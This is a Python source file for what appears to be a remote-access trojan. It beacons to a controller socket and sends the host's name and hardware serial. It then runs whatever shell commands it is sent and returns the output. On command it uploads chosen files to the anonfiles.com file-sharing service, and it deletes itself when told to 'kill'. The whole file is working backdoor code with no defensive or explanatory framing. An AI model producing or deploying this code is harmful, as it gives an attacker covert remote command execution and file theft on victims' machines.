import sys
import socket
import subprocess
import time
import os
import os.path
import threading
import string
import random
import pathlib
import requests

def uuidGen(size=6, chars=string.ascii_uppercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))
def getserial():
    os_type = sys.platform.lower()
    if "darwin" in os_type:
        command = "ioreg -l | grep IOPlatformSerialNumber"
    elif "win" in os_type:
        command = "wmic csproduct get UUID"
    elif "linux" in os_type:
        os.chdir(pathlib.Path(__file__).parent.resolve())
        if not os.path.exists('.xuuid'):
            file1 = open('.xuuid', "w")
            file1.write(uuidGen(32))
            file1.close()
        command = "cat .xuuid"
    return os.popen(command).read().replace("\n", "").replace("  ", "").replace(" ", "").replace("UUID","")

def upload_file(file,path):
    try:
        files = {
            'file': (file, open(path, 'rb')),
        }
        url = 'https://api.anonfiles.com/upload'
        response = requests.post(url, files=files)
        data = response.json()
        return data['data']['file']['url']['full']
    except:
        return 'Error uploading file'
def connect():
    HOST = '127.0.0.1'
    PORT = 90
    connected = False
    while(connected == False):
        print("Trying Connection")
        try:
            s = socket.socket()
            s.connect((HOST, PORT))
            connected = True
            s.send(socket.gethostname().encode())
            time.sleep(.001)
            s.send(getserial().encode())
            listen(s)
        except:
            time.sleep(5)
def listen(s):
    listening = True
    kill = False
    os_type = sys.platform.lower()
    while listening == True:
        try:
            cmd = s.recv(4096).decode()
            print(f'[*] receive {cmd}')
            cmd_buffer = cmd
            cmd, _, action = cmd_buffer.partition(' ')
            if (cmd.lower() == 'kill'):
                kill = True
                break
            elif (cmd.lower() == 'upload'):
                    path = os.path.abspath(action)
                    link = upload_file(action,path)
                    s.send(link.encode())
            elif(cmd.lower() == 'ls' and "win" in os_type):
                try:
                    result = subprocess.check_output("dir", stderr=subprocess.STDOUT, shell=True)
                except Exception as e:
                    result = str(e).encode()

                if len(result) == 0:
                    result = ' '.encode()
                msg_size = str(sys.getsizeof(result))
                s.send(msg_size.encode())
                time.sleep(.001)
                s.send(result)
            elif(cmd.lower() == 'connectionstatus'):
                pass
            elif(cmd.lower() == 'cd'):
                try:
                    os.chdir(action)
                except:
                    result =  "{}: No such file or directory".format(action)
            else:
                try:
                    result = subprocess.check_output(cmd + ' ' + action, stderr=subprocess.STDOUT, shell=True)
                except Exception as e:
                    result = str(e).encode()

                if len(result) == 0:
                    result = ' '.encode()
                msg_size = str(sys.getsizeof(result))
                s.send(msg_size.encode())
                time.sleep(.001)
                s.send(result)
        except:
            os.chdir(pathlib.Path(__file__).parent.resolve())
            listening = False
    if kill == True:
        os.remove(sys.argv[0])
        quit()
    else:
        s.close()
        connect()

if __name__ == "__main__":
    connect()
